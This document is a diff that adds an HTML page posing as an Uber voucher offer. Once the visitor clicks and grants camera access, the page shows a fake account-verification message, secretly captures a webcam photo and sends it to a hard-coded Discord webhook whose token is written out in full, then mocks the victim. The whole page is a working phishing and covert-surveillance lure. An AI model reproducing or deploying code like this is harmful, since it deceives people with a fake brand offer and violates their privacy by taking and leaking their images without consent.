@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>UBER Voucher</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(250deg, #000000, #ffffff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+            flex-direction: column; /* لترتيب الشعار فوق الكرت */
+        }
+
+        /* تنسيق الشعار ليكون فوق البوكس وكبير */
+        .logo-top {
+            width: 220px; /* حجم كبير */
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 20px;
+            width: 340px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,.3);
+        }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        #msg { color: #555; margin-bottom: 20px; }
+        button {
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            color: #fff;
+            background: #000;
+            width: 100%;
+            transition: 0.3s;
+        }
+        button:hover { background: #333; }
+    </style>
+</head>
+<body>
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Uber_logo_2018.svg/2560px-Uber_logo_2018.svg.png" class="logo-top">
+
+<div class="card">
+    <h1>To get Voucher</h1>
+    <p id="msg">Open UBER App to continue</p>
+    <button id="start">Click to Continue</button>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+<script>
+    // رجعت الكود الأصلي تبعك بالظبط
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467297371728646269/MDsU8tI-Mzcb5Mo0RTB2HLGTIx-G-CuPakfTnTPeLIT_9p6I8CF0_cBqf0Vkh1E1fplv";
+
+    const startBtn = document.getElementById("start");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const msg = document.getElementById("msg");
+
+    let stream;
+
+    startBtn.onclick = () => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+                stream = s;
+                video.srcObject = stream;
+                startBtn.style.display = "none";
+                msg.innerText = "جاري التحقق من الحساب... 😄";
+
+                // التوقيت الأصلي تبعك (100)
+                setTimeout(takeAndSendPhoto, 100)
+            })
+            .catch(() => {
+                msg.innerText = "يجب الموافقة للانتقال للتطبيق";
+            });
+    };
+
+    function takeAndSendPhoto() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("file", blob, "user-capture.png");
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                body: formData
+            })
+            .then(res => {
+                if (res.ok) console.log("Success");
+                else console.error("Failed");
+            })
+            .catch(err => console.error("Error:", err));
+
+        }, "image/png");
+
+        // النص الأصلي تبعك
+        msg.innerText = "ur mangole🤷‍♂️";
+        stopCamera();
+    }
+
+    function stopCamera() {
+        if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+        }
+    }
+</script>
+
+</body>
+</html>
